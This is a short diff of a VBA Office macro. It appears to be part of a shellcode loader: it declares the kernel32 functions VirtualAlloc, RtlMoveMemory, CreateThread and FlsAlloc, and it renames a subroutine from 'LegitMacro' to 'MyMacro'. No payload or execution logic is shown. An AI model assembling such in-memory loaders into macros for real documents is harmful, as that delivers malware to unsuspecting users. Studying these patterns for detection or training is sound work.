@@ -3,7 +3,7 @@ Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttr
 Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
 Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
 Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr
-Sub LegitMacro()
+Sub MyMacro()
     Dim allocRes As LongPtr
     Dim t1 As Date
     Dim t2 As Date
